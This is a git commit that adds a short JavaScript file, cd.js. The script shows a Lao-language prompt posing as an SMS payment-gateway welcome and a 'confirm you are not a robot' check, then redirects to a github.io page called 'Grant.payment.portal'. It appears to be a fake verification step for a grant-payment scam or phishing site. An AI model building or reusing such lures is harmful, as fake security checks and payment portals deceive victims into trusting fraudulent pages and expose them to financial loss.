c7714ccbaa25c12948032bf4542c6b40b24a08e1
seekersplc <bigmell41@gmail.com>
2025-05-14 22:25:43 +0100

    Create cd.js

---
+++ cd.js
@@ -0,0 +1,5 @@
+var password = 'ປະຕູການຈ່າຍເງິນ'
+password=prompt('SMS :ຍິນດີຕ້ອນຮັບສູ່ປະຕູການຈ່າຍເງິນ. ຄລິກຕົກລົງເພື່ອຢັ້ງຢືນວ່າທ່ານບໍ່ແມ່ນຫຸ່ນຍົນ. ','ປະຕູການຈ່າຍເງິນ');
+if (password != 'ປະຕູການຈ່າຍເງິນ') {
+location.href='https://seekersplc.github.io/Grant.payment.portal';
+}
